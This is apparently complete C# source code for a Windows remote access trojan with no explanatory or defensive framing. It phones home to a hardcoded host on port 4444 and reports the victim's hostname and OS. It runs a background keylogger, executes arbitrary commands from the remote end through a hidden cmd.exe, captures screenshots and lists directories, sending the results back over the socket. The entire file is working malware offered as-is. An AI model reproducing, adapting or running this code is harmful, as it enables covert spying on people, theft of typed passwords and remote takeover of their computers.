using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;

class Program
{
    private static string host = "192.168.0.16";
    private static int port = 4444;
    private static StringBuilder keys = 
        new StringBuilder();

    [DllImport("user32.dll")]
    private static extern short 
        GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern bool 
        GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    private static extern uint 
        MapVirtualKey(uint uCode, 
        uint uMapType);

    [DllImport("user32.dll")]
    private static extern int 
        ToUnicode(uint wVirtKey, 
        uint wScanCode, byte[] lpKeyState, 
        StringBuilder pwszBuff, int cchBuff, 
        uint wFlags);

    static void Main()
    {
        Thread t = new Thread(KeyLoggerLoop);
        t.IsBackground = true;
        t.Start();

        while (true)
        {
            try
            {
                using (TcpClient c = 
                    new TcpClient(host, port))
                using (NetworkStream s = 
                    c.GetStream())
                {
                    SendInit(s);
                    Loop(s);
                }
            }
            catch
            {
                Thread.Sleep(5000);
            }
        }
    }

    static void KeyLoggerLoop()
    {
        while (true)
        {
            Thread.Sleep(10);
            for (int i = 8; i < 255; i++)
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    ProcessKey(i);
                }
            }
        }
    }

    static void ProcessKey(int vk)
    {
        if (vk == 8) 
        {
            keys.Append("[BACK]");
            return;
        }
        if (vk == 13) 
        {
            keys.Append("\n");
            return;
        }
        if (vk == 32) 
        {
            keys.Append(" ");
            return;
        }

        byte[] state = new byte[256];
        GetKeyboardState(state);
        
        uint scan = MapVirtualKey((uint)vk, 0);
        StringBuilder buf = 
            new StringBuilder(5);
            
        int rc = ToUnicode((uint)vk, scan, 
            state, buf, buf.Capacity, 0);
            
        if (rc > 0)
        {
            keys.Append(buf.ToString());
        }
    }

    static void SendInit(NetworkStream s)
    {
        string h = Environment.MachineName;
        string o = 
            Environment.OSVersion.ToString();
        string json = string.Format(
            "{{\"hostname\":\"{0}\", " +
            "\"os\":\"{1}\", " +
            "\"country\":\"TR\"}}\n", 
            h, o
        );
        byte[] b = Encoding.UTF8.GetBytes(json);
        s.Write(b, 0, b.Length);
        s.Flush();
    }

    static void Loop(NetworkStream s)
    {
        StreamReader r = 
            new StreamReader(s, 
            Encoding.UTF8);
        while (true)
        {
            string raw = r.ReadLine();
            if (raw == null) break;
            ParseAndExec(raw.Trim(), s);
        }
    }

    static void ParseAndExec(string raw, 
        NetworkStream s)
    {
        try
        {
            string type = 
                GetJsonVal(raw, "type");
            string val = 
                GetJsonVal(raw, "value");

            if (type == "cmd")
            {
                string res = RunCmd(val);
                SendRes(s, "cmd", res);
            }
            else if (type == "screenshot")
            {
                string b64 = Cap();
                SendRes(s, "screenshot", b64);
            }
            else if (type == "files")
            {
                string files = ListDir(val);
                SendResJson(s, "files", files);
            }
            else if (type == "kl")
            {
                string log = keys.ToString();
                SendRes(s, "cmd", log);
            }
        }
        catch (Exception ex)
        {
            SendRes(s, "cmd", ex.Message);
        }
    }

    static string GetJsonVal(string j, 
        string key)
    {
        string target = 
            string.Format("\"{0}\"", key);
        int idx = j.IndexOf(target);
        if (idx == -1) return "";
        int start = j.IndexOf(":", idx);
        int open = j.IndexOf("\"", start);
        int close = j.IndexOf("\"", open + 1);
        return j.Substring(open + 1, 
            close - open - 1);
    }

    static void SendRes(NetworkStream s, 
        string t, string v)
    {
        v = v.Replace("\\", "\\\\")
             .Replace("\"", "\\\"")
             .Replace("\n", "\\n")
             .Replace("\r", "\\r");
        string json = string.Format(
            "{{\"type\":\"{0}\"," +
            "\"value\":\"{1}\"}}\n",
            t, v
        );
        byte[] b = Encoding.UTF8.GetBytes(json);
        s.Write(b, 0, b.Length);
        s.Flush();
    }

    static void SendResJson(NetworkStream s, 
        string t, string rawJson)
    {
        string json = string.Format(
            "{{\"type\":\"{0}\"," +
            "\"value\":\"{1}\"}}\n",
            t, rawJson.Replace("\"", "\\\"")
        );
        byte[] b = Encoding.UTF8.GetBytes(json);
        s.Write(b, 0, b.Length);
        s.Flush();
    }

    static string RunCmd(string cmd)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = 
            true;
        p.StartInfo.RedirectStandardError = 
            true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.CreateNoWindow = true;
        p.Start();
        string o = 
            p.StandardOutput.ReadToEnd();
        string e = 
            p.StandardError.ReadToEnd();
        p.WaitForExit();
        return o + e;
    }

    static string Cap()
    {
        try
        {
            Rectangle r = Rectangle.Empty;
            r = System.Windows.Forms.Screen
                .PrimaryScreen.Bounds;
            using (Bitmap b = 
                new Bitmap(r.Width, r.Height))
            using (Graphics g = 
                Graphics.FromImage(b))
            {
                g.CopyFromScreen(0, 0, 0, 0, 
                    r.Size);
                using (MemoryStream ms = 
                    new MemoryStream())
                {
                    b.Save(ms, ImageFormat.Png);
                    byte[] bytes = ms.ToArray();
                    return Convert
                        .ToBase64String(bytes);
                }
            }
        }
        catch (Exception ex)
        {
            return "Hata: " + ex.Message;
        }
    }

    static string ListDir(string path)
    {
        try
        {
            if (string.IsNullOrEmpty(path)) 
                path = "C:\\";
            string[] files = Directory
                .GetFileSystemEntries(path);
            List<string> clean = 
                new List<string>();
            foreach (string f in files)
            {
                string name = 
                    Path.GetFileName(f);
                name = name.Replace("\"", 
                    "\\\"");
                clean.Add(string.Format(
                    "\"{0}\"", name));
            }
            return "[" + string.Join(",", 
                clean.ToArray()) + "]";
        }
        catch (Exception ex)
        {
            return string.Format(
                "[\"Hata: {0}\"]", 
                ex.Message);
        }
    }
}
